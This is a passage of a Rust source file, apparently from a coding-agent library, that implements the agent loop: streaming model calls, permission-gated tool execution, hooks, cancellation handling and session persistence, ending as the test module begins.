//! Agent loop entry point.

use std::{future::Future, panic::AssertUnwindSafe, sync::Arc};

use futures_util::StreamExt;
use kuncode_core::{
    completion::{
        AssistantContent, CompletionError, CompletionModel, CompletionRequest,
        CompletionRequestBuilder, Message, ReasoningEffort, StreamEvent, ToolChoice, ToolResult,
        ToolResultContent, Usage, UserContent,
    },
    non_empty_vec::NonEmptyVec,
};
use tokio_util::sync::CancellationToken;

use crate::{
    error::AgentError,
    hook::{
        Hook, Hooks, PostToolCx, PostToolOutcome, PreToolCx, PreToolOutcome, PromptCx,
        PromptOutcome, StopCx, StopOutcome,
    },
    observer::{AgentEvent, AgentObserver, EventKind, ToolFailure},
    permission::{Approver, AutoApprove, Decision, PermissionGate, PermissionPolicy, Prepared},
    registry::ToolRegistry,
    session::AgentSession,
    session_store::{NewJournalEntry, SessionStore},
    system_prompt::{PromptContext, SystemPrompt},
    tool::{ToolContext, ToolError, ToolErrorKind, ToolOutput},
};

const DEFAULT_MAX_ITERATIONS: usize = 50;

/// How many times a `Stop` hook may force a continuation within one
/// [`run_loop`](AgentRunner::run_loop) before the runner stops honoring it.
/// Bounds a misbehaving "you're not done" hook; `max_iterations` is the harder
/// backstop. Mirrors Claude Code's `stop_hook_active`.
const STOP_CONTINUATION_LIMIT: usize = 3;

/// Injected as a user message when the task plan has gone idle for
/// [`AgentConfig::todo_reminder_interval`] model calls. A soft nudge, not
/// enforcement — it re-surfaces the plan into context so a long task does not
/// drift off it. The `<reminder>` framing marks it as harness-injected, not the
/// user speaking.
const TODO_REMINDER: &str = "<reminder>Keep the task plan current: call todo_write to \
mark finished steps completed and set the next one in_progress.</reminder>";

/// Runtime knobs for one agent loop.
#[derive(Clone, Debug)]
pub struct AgentConfig {
    /// Maximum number of model calls before the loop aborts.
    pub max_iterations: usize,
    /// Output token cap passed to each completion request.
    pub max_tokens: Option<u64>,
    /// Reasoning effort passed through to the provider.
    pub reasoning: Option<ReasoningEffort>,
    /// Tool-call policy passed through to the provider.
    pub tool_choice: Option<ToolChoice>,
    /// After this many consecutive model calls without the task plan changing,
    /// inject a `<reminder>` message nudging the model to call `todo_write`.
    /// `None` disables the nag.
    ///
    /// A soft scaffold, not enforcement: it only re-surfaces the plan into
    /// context. The counter tracks iterations since the plan's *generation* last
    /// advanced, so any accepted `todo_write` (even an identical resubmit) resets
    /// it; a rejected one does not.
    pub todo_reminder_interval: Option<usize>,
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            max_iterations: DEFAULT_MAX_ITERATIONS,
            max_tokens: Some(32768),
            reasoning: None,
            tool_choice: None,
            // Off by default: a library default that injects extra messages would
            // surprise embedders. The CLI opts in.
            todo_reminder_interval: None,
        }
    }
}

/// Summary for one completed user turn appended to an existing transcript.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct AgentTurn {
    /// Index of the final assistant message inside the caller-owned transcript.
    pub final_message_index: usize,
    /// Provider usage aggregated across this turn's model calls.
    pub usage: Usage,
    /// Number of model calls performed for this turn.
    pub iterations: usize,
}

impl AgentTurn {
    /// Concatenates visible text blocks from the final assistant message.
    pub fn final_text(&self, session: &AgentSession) -> String {
        final_text_at(session.messages(), self.final_message_index)
    }
}

/// Minimal agent loop for model/tool/model interaction.
#[derive(Clone)]
pub struct AgentRunner<M> {
    model: M,
    registry: ToolRegistry,
    config: AgentConfig,
    /// Assembles the first system message per request from pluggable sections.
    /// Empty by default, in which case no system message is sent. Shared
    /// read-only across turns, like the other collaborators.
    system_prompt: Arc<SystemPrompt>,
    /// Static permission rules, shared read-only across turns.
    policy: Arc<PermissionPolicy>,
    /// Side-effecting approval layer consulted on an `Ask` verdict.
    approver: Arc<dyn Approver>,
    /// Optional progress sink. With `None` (the default) [`emit`](Self::emit)
    /// invokes no observer and draws no `seq`.
    observer: Option<Arc<dyn AgentObserver>>,
    /// User-extensible loop intervention points. Empty by default, in which case
    /// every trigger site skips the hook machinery entirely (fast path).
    hooks: Arc<Hooks>,
    session_store: Option<Arc<dyn SessionStore>>,
}

impl<M> AgentRunner<M>
where
    M: CompletionModel,
{
    /// Creates a runner with default loop configuration.
    ///
    /// Defaults to the built-in deny rules and an [`AutoApprove`] approver, so
    /// dangerous commands are still blocked but nothing prompts. Callers that
    /// want a human in the loop set one via [`with_approver`](Self::with_approver).
    pub fn new(model: M, registry: ToolRegistry) -> Self {
        Self::with_config(model, registry, AgentConfig::default())
    }

    /// Creates a runner with explicit loop configuration.
    pub fn with_config(model: M, registry: ToolRegistry, config: AgentConfig) -> Self {
        Self {
            model,
            registry,
            config,
            system_prompt: Arc::new(SystemPrompt::default()),
            policy: Arc::new(PermissionPolicy::builtin()),
            approver: Arc::new(AutoApprove),
            observer: None,
            hooks: Arc::new(Hooks::new()),
            session_store: None,
        }
    }

    /// Replaces the system-prompt assembler (e.g. the CLI's full section set).
    pub fn with_system_prompt(mut self, system_prompt: SystemPrompt) -> Self {
        self.system_prompt = Arc::new(system_prompt);
        self
    }

    /// Replaces the static permission policy.
    pub fn with_policy(mut self, policy: PermissionPolicy) -> Self {
        self.policy = Arc::new(policy);
        self
    }

    /// Replaces the approval layer (e.g. a terminal prompt in the CLI).
    pub fn with_approver(mut self, approver: Arc<dyn Approver>) -> Self {
        self.approver = approver;
        self
    }

    /// Attaches a progress observer (e.g. the CLI's terminal renderer).
    pub fn with_observer(mut self, observer: Arc<dyn AgentObserver>) -> Self {
        self.observer = Some(observer);
        self
    }

    /// Appends one loop hook, keeping registration order.
    pub fn with_hook(mut self, hook: Arc<dyn Hook>) -> Self {
        Arc::make_mut(&mut self.hooks).push(hook);
        self
    }

    /// Replaces the whole hook set (e.g. the ones parsed from settings).
    pub fn with_hooks(mut self, hooks: Hooks) -> Self {
        self.hooks = Arc::new(hooks);
        self
    }

    pub fn with_session_store(mut self, store: Arc<dyn SessionStore>) -> Self {
        self.session_store = Some(store);
        self
    }

    /// Emits one event, but only when an observer is attached — with none the
    /// `seq` is left untouched and nothing is dispatched. The `seq` is drawn at
    /// emit time, the single source of total ordering.
    ///
    /// A panicking observer is isolated here: the rendering frontend must never
    /// be able to unwind the agent loop. This one chokepoint covers every sink —
    /// a bare observer as well as a
    /// [`CompositeObserver`](crate::observer::CompositeObserver), whose own
    /// per-observer guard additionally keeps siblings rendering when one panics.
    fn emit(&self, session: &mut AgentSession, iteration: Option<usize>, kind: EventKind) {
        if let Some(observer) = &self.observer {
            let event = AgentEvent {
                seq: session.next_seq(),
                iteration,
                kind,
            };
            let _ = std::panic::catch_unwind(AssertUnwindSafe(|| observer.on_event(&event)));
        }
    }

    async fn push_user_message(&self, session: &mut AgentSession, prompt: impl Into<String>) {
        self.push_message(session, Message::user(prompt)).await;
    }

    async fn push_message(&self, session: &mut AgentSession, message: Message) {
        let session_id = session.session_id().cloned();
        if let (Some(store), Some(session_id)) = (&self.session_store, session_id)
            && session.is_durable()
        {
            match NewJournalEntry::message(&message) {
                Ok(entry) => {
                    if let Err(error) = store.append(&session_id, entry).await {
                        session.mark_persistence_failed(error.to_string());
                    }
                }
                Err(error) => session.mark_persistence_failed(error.to_string()),
            }
        }
        session.push(message);
    }

    /// Emits the single turn-terminal [`Error`](EventKind::Error) for a failing
    /// turn, then returns the error unchanged.
    ///
    /// Every unwind path routes through here: `run_loop` failures via
    /// [`continue_session_with`](Self::continue_session_with), and a
    /// `UserPromptSubmit` `Block`/cancel directly from
    /// [`run_turn_with`](Self::run_turn_with) — which returns before `run_loop`
    /// is ever entered, so it would otherwise miss the emit. One helper keeps
    /// "exactly one terminal `Error` per turn" true and closes any open
    /// `ModelStart`/`ToolStart` UI state once. `iteration` is `None` for
    /// failures with no owning model call (empty transcript, blocked prompt,
    /// `max_iterations == 0`).
    fn terminal_error(
        &self,
        session: &mut AgentSession,
        iteration: Option<usize>,
        error: AgentError,
    ) -> AgentError {
        self.emit(
            session,
            iteration,
            EventKind::Error {
                kind: error_kind(&error).to_string(),
                message: error.to_string(),
            },
        );
        error
    }

    /// Appends a user prompt, then advances the transcript until a final answer.
    pub async fn run_turn(
        &self,
        session: &mut AgentSession,
        prompt: impl Into<String>,
    ) -> Result<AgentTurn, AgentError> {
        self.run_turn_with(session, prompt, CancellationToken::new())
            .await
    }

    /// Like [`run_turn`](Self::run_turn) but with a caller-owned cancellation
    /// token (wire it to Ctrl-C for interruptible turns).
    pub async fn run_turn_with(
        &self,
        session: &mut AgentSession,
        prompt: impl Into<String>,
        cancel: CancellationToken,
    ) -> Result<AgentTurn, AgentError> {
        let prompt = prompt.into();

        // `UserPromptSubmit` is a *pre-commit* hook: it runs before the prompt
        // enters the transcript, so a `Block` rejects the input without leaving
        // it behind to leak to the provider on a later turn. The cx borrows the
        // transcript, so it is scoped to end before any `push_user`.
        if self.hooks.is_empty() {
            self.push_user_message(session, prompt).await;
        } else {
            let outcome = {
                let cx = PromptCx {
                    prompt: &prompt,
                    messages: session.messages(),
                };
                cancellable(&cancel, self.hooks.user_prompt_submit(&cx)).await
            };
            match outcome {
                None => return Err(self.terminal_error(session, None, AgentError::Cancelled)),
                Some(PromptOutcome::Proceed) => self.push_user_message(session, prompt).await,
                Some(PromptOutcome::AddContext(context)) => {
                    self.push_user_message(session, prompt).await;
                    self.push_user_message(session, context).await;
                }
                Some(PromptOutcome::Block { reason }) => {
                    return Err(self.terminal_error(
                        session,
                        None,
                        AgentError::PromptBlocked { reason },
                    ));
                }
            }
        }

        self.continue_session_with(session, cancel).await
    }

    /// Advances an existing transcript in place until the model stops calling tools.
    pub async fn continue_session(
        &self,
        session: &mut AgentSession,
    ) -> Result<AgentTurn, AgentError> {
        self.continue_session_with(session, CancellationToken::new())
            .await
    }

    /// Like [`continue_session`](Self::continue_session) but with a caller-owned
    /// cancellation token.
    pub async fn continue_session_with(
        &self,
        session: &mut AgentSession,
        cancel: CancellationToken,
    ) -> Result<AgentTurn, AgentError> {
        let result = self.run_loop(session, &cancel).await;
        // Drained here — after the loop, not per iteration — so the turn's
        // *final* pushes (the closing assistant message, the last tool batch,
        // pushes on an unwinding error path) are covered too. A one-shot run
        // exits right after this turn; a loop-head check would let a failure
        // in those last writes escape unreported forever.
        self.warn_persistence(session);
        match result {
            Ok(turn) => Ok(turn),
            Err((iteration, error)) => Err(self.terminal_error(session, iteration, error)),
        }
    }

    /// Reports a session-persistence failure as a one-shot
    /// [`Warning`](EventKind::Warning). `iteration` is `None`: the failure
    /// belongs to a past push, not to any model call.
    ///
    /// With no observer attached the error is deliberately **left in the
    /// session** — `take_persistence_error` is take-and-clear, so draining it
    /// into a no-op emit would destroy the only report; leaving it lets a
    /// later observer-bearing runner still surface it.
    fn warn_persistence(&self, session: &mut AgentSession) {
        if self.observer.is_none() {
            return;
        }
        if let Some(message) = session.take_persistence_error() {
            self.emit(session, None, EventKind::Warning { message });
        }
    }

    /// The model/tool loop. Returns the failing iteration alongside the error so
    /// [`continue_session_with`](Self::continue_session_with) can emit a single
    /// turn-terminal [`Error`](EventKind::Error) with the right `iteration`.
    async fn run_loop(
        &self,
        session: &mut AgentSession,
        cancel: &CancellationToken,
    ) -> Result<AgentTurn, (Option<usize>, AgentError)> {
        if session.is_empty() {
            return Err((None, AgentError::EmptyTranscript));
        }

        let mut usage = Usage::default();
        // Local to this run, so the cap resets every turn; on the session it
        // would accumulate and permanently disable later turns' `Stop` hooks.
        let mut stop_continuations = 0usize;

        // Plan-nag bookkeeping. `idle_iterations` counts model calls since the
        // plan's generation last advanced; when it reaches the configured
        // interval we re-surface the plan. Tracked by generation (not tool name)
        // so the runner stays agnostic to which tool maintains the plan.
        let reminder_interval = self.config.todo_reminder_interval;
        let mut last_todo_generation = session.todo_generation();
        let mut idle_iterations = 0usize;

        for iteration in 0..self.config.max_iterations {
            // A `todo_write` in the previous iteration's tool batch shows up as an
            // advanced generation: reset the idle counter. Otherwise nudge once
            // the plan has sat untouched for `interval` calls.
            let generation_now = session.todo_generation();
            if generation_now != last_todo_generation {
                last_todo_generation = generation_now;
                idle_iterations = 0;
            }
            if reminder_interval.is_some_and(|interval| idle_iterations >= interval) {
                self.push_user_message(session, TODO_REMINDER.to_string())
                    .await;
                idle_iterations = 0;
            }
            idle_iterations += 1;

            let iteration_result = self
                .run_iteration(session, iteration, cancel)
                .await
                .map_err(|error| (Some(iteration), error))?;
            usage += iteration_result.usage;

            if iteration_result.tool_calls.is_empty() {
                // A `Stop` hook may force another iteration — but only while
                // there is budget for another model call and the continuation
                // cap is not yet hit. Out of either, the final answer the model
                // just gave is returned as-is, never turned into a
                // `MaxIterations` error.
                let may_continue = !self.hooks.is_empty()
                    && stop_continuations < STOP_CONTINUATION_LIMIT
                    && iteration + 1 < self.config.max_iterations;
                if may_continue {
                    let outcome = {
                        let cx = StopCx {
                            messages: session.messages(),
                            iteration,
                        };
                        cancellable(cancel, self.hooks.stop(&cx)).await
                    };
                    match outcome {
                        None => return Err((Some(iteration), AgentError::Cancelled)),
                        Some(StopOutcome::Allow) => {}
                        Some(StopOutcome::Continue { message }) => {
                            stop_continuations += 1;
                            self.push_user_message(session, message).await;
                            continue;
                        }
                    }
                }
                return Ok(AgentTurn {
                    final_message_index: iteration_result.assistant_message_index,
                    usage,
                    iterations: iteration + 1,
                });
            }

            self.execute_tool_calls(session, iteration_result.tool_calls, iteration, cancel)
                .await
                .map_err(|error| (Some(iteration), error))?;
        }

        Err((
            // The last model call we made, or `None` when the budget was 0.
            self.config.max_iterations.checked_sub(1),
            AgentError::MaxIterations {
                max_iterations: self.config.max_iterations,
                messages: session.messages().to_vec(),
                usage,
            },
        ))
    }

    async fn run_iteration(
        &self,
        session: &mut AgentSession,
        iteration: usize,
        cancel: &CancellationToken,
    ) -> Result<IterationResult, AgentError> {
        let request = self.build_request(session)?;
        // Open the "thinking" state only after a successful build (a build
        // failure never started a model call). On completion error/cancel the
        // turn-terminal `Error` closes it; on success the `Assistant` below does.
        self.emit(session, Some(iteration), EventKind::ModelStart);
        // Race the whole stream (establish + consume) against cancellation.
        // Waiting on the model is the most common place a user hits Ctrl-C, so
        // the token must cover it — not just the later tool approval/execution.
        // Dropping the future drops the stream, which closes the in-flight HTTP
        // response and halts generation.
        let (choice, usage) =
            match cancellable(cancel, self.stream_completion(session, iteration, request)).await {
                Some(result) => result?,
                None => return Err(AgentError::Cancelled),
            };

        let tool_calls = pending_tool_calls(&choice);
        // Build the event payload before moving `choice` into the transcript;
        // `Assistant` doubles as the `ModelStart` close and finalizes the
        // streamed deltas with the authoritative text.
        let text = assistant_text(&choice);
        let tool_call_ids: Vec<String> = tool_calls.iter().map(|call| call.id.clone()).collect();
        self.emit(
            session,
            Some(iteration),
            EventKind::Assistant {
                text,
                tool_calls: tool_call_ids,
            },
        );

        // Streaming carries no message id (unlike OpenAI-Responses-style APIs).
        self.push_message(
            session,
            Message::Assistant {
                id: None,
                content: choice,
            },
        )
        .await;

        Ok(IterationResult {
            assistant_message_index: session.messages().len() - 1,
            usage,
            tool_calls,
        })
    }

    /// Drives the model's stream to its terminal [`StreamEvent::Completed`],
    /// emitting render deltas (text/reasoning) to the observer as they arrive.
    ///
    /// Returns the fully-assembled assistant content and token usage. The loop
    /// branches on the content (tool calls vs final answer), so the stream's
    /// `finish_reason` is not consumed here.
    ///
    /// # Errors
    ///
    /// Propagates a model/transport [`CompletionError`], or a `ResponseError` if
    /// the stream ends without a `Completed` event.
    async fn stream_completion(
        &self,
        session: &mut AgentSession,
        iteration: usize,
        request: CompletionRequest,
    ) -> Result<(NonEmptyVec<AssistantContent>, Usage), AgentError> {
        let mut stream = self.model.stream(request).await?;
        while let Some(event) = stream.next().await {
            match event? {
                StreamEvent::TextDelta(text) => {
                    self.emit(session, Some(iteration), EventKind::TextDelta { text });
                }
                StreamEvent::ReasoningDelta(text) => {
                    self.emit(session, Some(iteration), EventKind::ReasoningDelta { text });
                }
                // The "calling X" hint is surfaced by `ToolStart` after the turn
                // completes and the call is gated; ignore the earlier signal.
                StreamEvent::ToolCallStart { .. } => {}
                StreamEvent::Completed { content, usage, .. } => return Ok((content, usage)),
            }
        }
        Err(
            CompletionError::ResponseError("stream ended without a completion event".to_string())
                .into(),
        )
    }

    async fn execute_tool_calls(
        &self,
        session: &mut AgentSession,
        tool_calls: Vec<PendingToolCall>,
        iteration: usize,
        cancel: &CancellationToken,
    ) -> Result<(), AgentError> {
        // `PostToolUse` feedback is buffered and flushed only after the whole
        // batch's tool_results are written: a tool_call's results must stay
        // contiguous in the next user content, so a feedback message must not be
        // interleaved between two tool_results (providers reject that).
        let mut feedback = Vec::new();

        for index in 0..tool_calls.len() {
            let ctx = ToolContext::with_cancel(cancel.clone()).with_todos(session.todo_handle());
            let id = tool_calls[index].id.clone();
            let call_id = tool_calls[index].call_id.clone();
            let name = tool_calls[index].name.clone();
            let arguments = tool_calls[index].arguments.clone();
            // Snapshot the plan generation so a successful `todo_write` is
            // detected by the counter advancing — generic, no tool-name check.
            let todo_generation = session.todo_generation();

            match self
                .gated_call(session, iteration, &id, &name, arguments, &ctx)
                .await
            {
                Ok(CallOutcome { output, executed }) => {
                    // Snapshot the output for PostToolUse before record_result
                    // consumes it — only when a hook could actually use it.
                    let post_output = (executed && !self.hooks.is_empty()).then(|| output.clone());
                    self.record_result(session, iteration, id, call_id, &name, output)
                        .await;

                    // The plan changed iff the generation advanced (a validation
                    // failure does not bump it, so a rejected `todo_write` emits
                    // no update). Fire after `ToolEnd`, before `PostToolUse`, so a
                    // hook that cancels still leaves the plan render correct.
                    if session.todo_generation() != todo_generation {
                        let todos = session.todos_snapshot();
                        self.emit(session, Some(iteration), EventKind::TodoUpdate { todos });
                    }

                    if let Some(output) = post_output {
                        let outcome = {
                            let cx = PostToolCx {
                                tool: &name,
                                output: &output,
                                messages: session.messages(),
                                iteration,
                            };
                            cancellable(cancel, self.hooks.post_tool_use(&cx)).await
                        };
                        match outcome {
                            // Cancelled mid-batch: this tool's result is already
                            // written, so only the *following* calls are unpaired
                            // (re-pairing `index` would double-write it). Buffered
                            // feedback is dropped — the turn is unwinding.
                            None => {
                                self.pair_unpaired(session, iteration, &tool_calls[index + 1..])
                                    .await;
                                return Err(AgentError::Cancelled);
                            }
                            Some(PostToolOutcome::Proceed) => {}
                            Some(PostToolOutcome::AddFeedback(text)) => feedback.push(text),
                        }
                    }
                }
                Err(error) => {
                    // The turn is unwinding with this tool_call — and any that
                    // follow it — still unpaired. Pair `index` *honestly by why*:
                    // a harness tool error did run and fail (don't relabel it
                    // "cancelled"); a cancel/abort did not run.
                    let failed = match &error {
                        AgentError::Tool { source, .. } => {
                            ToolOutput::failure(ToolErrorKind::ToolError, source.to_string())
                        }
                        _ => interrupted_tool_output(),
                    };
                    self.record_result(session, iteration, id, call_id, &name, failed)
                        .await;
                    self.pair_unpaired(session, iteration, &tool_calls[index + 1..])
                        .await;
                    // Buffered PostToolUse feedback is dropped here, same as the
                    // cancel branch above: the turn is unwinding, the end-of-loop
                    // flush is never reached, and a failed turn should not leave a
                    // trailing feedback message behind. The harness-error path
                    // (`AgentError::Tool`) is rare; feedback is advisory and the
                    // real file state survives for the next turn to re-read.
                    return Err(error);
                }
            }
        }

        // Flush buffered feedback after the batch's tool_results (see above).
        for text in feedback {
            self.push_user_message(session, text).await;
        }

        Ok(())
    }

    /// Pairs every still-unexecuted tool_call with a synthetic interrupted
    /// result, so an unwinding turn never leaves an assistant tool_call
    /// dangling — most providers reject a request whose tool_call has no
    /// matching tool_result before the next user message.
    async fn pair_unpaired(
        &self,
        session: &mut AgentSession,
        iteration: usize,
        calls: &[PendingToolCall],
    ) {
        for call in calls {
            self.record_result(
                session,
                iteration,
                call.id.clone(),
                call.call_id.clone(),
                &call.name,
                interrupted_tool_output(),
            )
            .await;
        }
    }

    /// Records one tool result: emits the [`ToolEnd`](EventKind::ToolEnd) that
    /// mirrors `output` — same `ok`/`error`/`truncated` — then appends the
    /// transcript `tool_result` carrying the same `output`.
    ///
    /// The sole producer of either half, so the invariant "exactly one
    /// `ToolEnd` per transcript `tool_result`, both describing the same outcome"
    /// is structural: a new result path calls this and cannot emit the event
    /// without the transcript write, or let the two describe different outcomes.
    /// Event before transcript so a UI row closes no later than the result lands.
    async fn record_result(
        &self,
        session: &mut AgentSession,
        iteration: usize,
        id: String,
        call_id: Option<String>,
        tool: &str,
        output: ToolOutput,
    ) {
        self.emit(
            session,
            Some(iteration),
            EventKind::ToolEnd {
                tool_call_id: id.clone(),
                tool: tool.to_string(),
                ok: output.ok,
                truncated: output.truncated,
                error: output.error.as_ref().map(ToolFailure::from),
            },
        );
        self.push_message(
            session,
            tool_result_message(id, call_id, output.to_model_content()),
        )
        .await;
    }

    /// Gates a tool call, then dispatches. The gate races the approval prompt
    /// against cancellation; this method races execution.
    ///
    /// Returns a [`CallOutcome`]: the model-recoverable [`ToolOutput`] to record
    /// plus whether the tool actually ran. Unknown tools, bad arguments, and
    /// hook/permission denials carry `executed: false` (the loop feeds the
    /// output back). A user `Abort` or a cancelled token escalates to
    /// [`AgentError::Cancelled`], and a harness-level tool failure to
    /// [`AgentError::Tool`]; both unwind the whole turn (so neither is a
    /// `CallOutcome` and neither fires `PostToolUse`).
    ///
    /// Emits [`EventKind::ToolStart`] between the gate's two phases — once a
    /// [`PermissionRequest`](crate::permission::PermissionRequest) is in hand —
    /// so an unknown tool / bad arguments (rejected by `prepare`) get a `ToolEnd`
    /// with no preceding `ToolStart`. `PreToolUse` fires after that row opens and
    /// before the gate decides, so a hook denial mirrors a permission denial.
    async fn gated_call(
        &self,
        session: &mut AgentSession,
        iteration: usize,
        tool_call_id: &str,
        name: &str,
        arguments: serde_json::Value,
        ctx: &ToolContext,
    ) -> Result<CallOutcome, AgentError> {
        let gate = PermissionGate {
            policy: self.policy.as_ref(),
            approver: self.approver.as_ref(),
            registry: &self.registry,
        };

        // prepare: resolve + parse. An unknown tool / bad arguments never produce
        // a request, so they short-circuit here with no `ToolStart`.
        let (tool, arguments, request) = match gate.prepare(name, arguments, ctx) {
            Prepared::Ready {
                tool,
                args,
                request,
            } => (tool, args, request),
            Prepared::Rejected(output) => {
                return Ok(CallOutcome {
                    output,
                    executed: false,
                });
            }
        };

        // The request confirms a real call and carries a human summary, so open
        // the tool's UI row now — before the (possibly blocking) approval inside
        // `decide`.
        self.emit(
            session,
            Some(iteration),
            EventKind::ToolStart {
                tool_call_id: tool_call_id.to_string(),
                tool: request.tool.clone(),
                summary: request.summary.clone(),
            },
        );

        // PreToolUse runs after the row opens and before the gate decides.
        // Tighten-only: a `Deny` short-circuits *without* consulting the
        // approver, taking the same path (and event shape) as a permission deny.
        // The cx borrows the request/args/transcript, so it is scoped to end
        // before `decide` takes `&mut` of the session.
        if !self.hooks.is_empty() {
            let pre = {
                let cx = PreToolCx {
                    request: &request,
                    args: &arguments,
                    messages: session.messages(),
                    iteration,
                };
                cancellable(&ctx.cancel, self.hooks.pre_tool_use(&cx)).await
            };
            match pre {
                None => return Err(AgentError::Cancelled),
                Some(PreToolOutcome::Proceed) => {}
                Some(PreToolOutcome::Deny { message }) => {
                    return Ok(CallOutcome {
                        output: ToolOutput::failure(ToolErrorKind::BlockedByHook, message),
                        executed: false,
                    });
                }
            }
        }

        match gate.decide(&request, session.permissions_mut(), ctx).await {
            Decision::Deny(output) => Ok(CallOutcome {
                output,
                executed: false,
            }),
            Decision::Abort => Err(AgentError::Cancelled),
            // Execute, racing cancellation so a long tool can be interrupted.
            Decision::Allow => {
                match cancellable(&ctx.cancel, tool.call(arguments, ctx)).await {
                    None => Err(AgentError::Cancelled),
                    Some(Ok(output)) => Ok(CallOutcome {
                        output,
                        executed: true,
                    }),
                    // A tool that surfaces its own cancellation is still a
                    // turn-level interrupt. The harness no longer synthesizes this
                    // (a cancelled token loses the race to `None` above), so this is
                    // a defensive arm for a tool that returns it itself.
                    Some(Err(ToolError::Cancelled)) => Err(AgentError::Cancelled),
                    Some(Err(source)) => Err(AgentError::Tool {
                        name: name.to_string(),
                        source,
                    }),
                }
            }
        }
    }

    fn build_request(&self, session: &AgentSession) -> Result<CompletionRequest, AgentError> {
        if session.is_empty() {
            return Err(AgentError::EmptyTranscript);
        }

        // Assembled fresh each request. Request-only: never stored in the
        // transcript. Kept stable within a session (no volatile blocks) so it
        // stays a cacheable prefix.
        let tools = self.registry.definition();
        let system = self
            .system_prompt
            .assemble(&PromptContext { tools: &tools });

        let mut chat_history =
            Vec::with_capacity(session.messages().len() + usize::from(system.is_some()));
        if let Some(system) = system {
            chat_history.push(Message::system(system));
        }
        chat_history.extend(session.messages().iter().cloned());

        Ok(CompletionRequestBuilder::from_messages(
            NonEmptyVec::try_from(chat_history).map_err(|_| AgentError::EmptyTranscript)?,
        )
        .tools(tools)
        .max_tokens(self.config.max_tokens)
        .reasoning(self.config.reasoning)
        .tool_choice(self.config.tool_choice.clone())
        .build())
    }
}

/// Races `fut` against `cancel`, returning `None` if the token fires first and
/// `Some(output)` otherwise.
///
/// The single home for the loop's cancellation race: every interruptible await
/// point (model request, tool execution, each hook) goes through here, so the
/// contract lives in one place rather than re-spelled at each site:
///
/// - **`biased`** — the cancel branch is polled first, so an already-cancelled
///   token wins deterministically and the future is never started.
/// - **drop cancels** — losing the race drops `fut`, cancelling any in-flight
///   work it owns (the provider's HTTP call, a child process, a hook's shell-out).
/// - **`None` means cancelled** — the caller owns what to do then (unwind, pair
///   remaining tool_calls, emit a terminal error); this helper deliberately does
///   no cleanup, since each site's is different.
async fn cancellable<T>(cancel: &CancellationToken, fut: impl Future<Output = T>) -> Option<T> {
    tokio::select! {
        biased;
        _ = cancel.cancelled() => None,
        output = fut => Some(output),
    }
}

#[derive(Debug)]
struct IterationResult {
    assistant_message_index: usize,
    usage: Usage,
    tool_calls: Vec<PendingToolCall>,
}

#[derive(Debug)]
struct PendingToolCall {
    id: String,
    call_id: Option<String>,
    name: String,
    arguments: serde_json::Value,
}

/// Result of a gated tool call: the [`ToolOutput`] to record plus whether the
/// tool actually ran.
///
/// `executed` is true only on the `Decision::Allow` path where `tool.call`
/// returned a deliverable output — never for unknown tools, bad arguments, or
/// denials (all `executed: false`), and never for a harness-boundary
/// [`AgentError::Tool`] (that returns `Err`, not a `CallOutcome`). `PostToolUse`
/// fires only when `executed` is true.
struct CallOutcome {
    output: ToolOutput,
    executed: bool,
}

fn pending_tool_calls(content: &NonEmptyVec<AssistantContent>) -> Vec<PendingToolCall> {
    content
        .iter()
        .filter_map(|content| match content {
            AssistantContent::ToolCall(tool_call) => Some(PendingToolCall {
                id: tool_call.id.clone(),
                call_id: tool_call.call_id.clone(),
                name: tool_call.function.name.clone(),
                arguments: tool_call.function.arguments.clone(),
            }),
            _ => None,
        })
        .collect()
}

fn tool_result_message(id: String, call_id: Option<String>, content: String) -> Message {
    Message::User {
        content: NonEmptyVec::new(UserContent::ToolResult(ToolResult {
            id,
            call_id,
            content: NonEmptyVec::new(ToolResultContent::text(content)),
        })),
    }
}

/// A synthetic tool result that pairs a tool_call the turn never executed —
/// because it was aborted or cancelled first. Without it the assistant's
/// tool_call message would dangle, and most providers reject a tool_call with
/// no matching tool_result on the next request. Returned as a [`ToolOutput`] so
/// the same value feeds both the transcript and its mirrored `ToolEnd`.
fn interrupted_tool_output() -> ToolOutput {
    ToolOutput::failure(
        ToolErrorKind::Cancelled,
        "Tool call not executed: the turn was interrupted before this tool returned.",
    )
}

/// Maps an [`AgentError`] to the stable `kind` string on
/// [`EventKind::Error`]. Kept exhaustive so a new variant forces a decision.
fn error_kind(error: &AgentError) -> &'static str {
    match error {
        AgentError::Completion(_) => "completion",
        AgentError::Tool { .. } => "tool",
        AgentError::EmptyTranscript => "empty_transcript",
        AgentError::Cancelled => "cancelled",
        AgentError::PromptBlocked { .. } => "prompt_blocked",
        AgentError::MaxIterations { .. } => "max_iterations",
    }
}

fn assistant_content_at(
    messages: &[Message],
    index: usize,
) -> Option<&NonEmptyVec<AssistantContent>> {
    match messages.get(index) {
        Some(Message::Assistant { content, .. }) => Some(content),
        _ => None,
    }
}

fn final_text_at(messages: &[Message], index: usize) -> String {
    assistant_content_at(messages, index)
        .map(assistant_text)
        .unwrap_or_default()
}

fn assistant_text(content: &NonEmptyVec<AssistantContent>) -> String {
    content
        .iter()
        .filter_map(|content| match content {
            AssistantContent::Text(text) => Some(text.text_ref()),
            _ => None,
        })
        .collect::<Vec<_>>()
        .join("")
}

#[cfg(test)]
mod tests {
    use std::{
        collections::VecDeque,
        sync::{
            Arc, Mutex,
            atomic::{AtomicUsize, Ordering},
        },
    };

    use async_trait::async_trait;
    use kuncode_core::completion::{
        AssistantContent, CompletionError, CompletionRequest, CompletionResponse, CompletionStream,
        FinishReason, Message, StreamEvent, ToolDefinition, ToolResultContent, Usage, UserContent,
    };
    use kuncode_core::non_empty_vec::NonEmptyVec;
    use schemars::JsonSchema;
    use serde::Deserialize;
    use serde_json::Value;
    use tokio_util::sync::CancellationToken;

    use super::{AgentConfig, AgentRunner, TODO_REMINDER, cancellable};
    use crate::{
        error::AgentError,
        hook::{
            Hook, PostToolCx, PostToolOutcome, PreToolCx, PreToolOutcome, ScriptedHook, StopCx,
            StopOutcome,
        },
        observer::{AgentEvent, AgentObserver, CompositeObserver, EventKind},
        permission::{
            ApprovalOutcome, PermissionAction, PermissionPolicy, PermissionRequest, RuleOrigin,
            ScriptedApprover, parse_rule,
        },
        registry::ToolRegistry,
        session::AgentSession,
        session_store::{NewSession, Seq, SessionStore, sqlite::SqliteSessionStore},
        system_prompt::{IdentitySection, SystemPrompt},
        test_support::TestDir,
        tool::{
            Tool, ToolContext, ToolError, ToolOutput, TypedTool, bash::Bash, definition_for,
            todo_write::TodoWrite,
        },
    };

    /// A tool whose `run` never completes — used to test that a cancellation
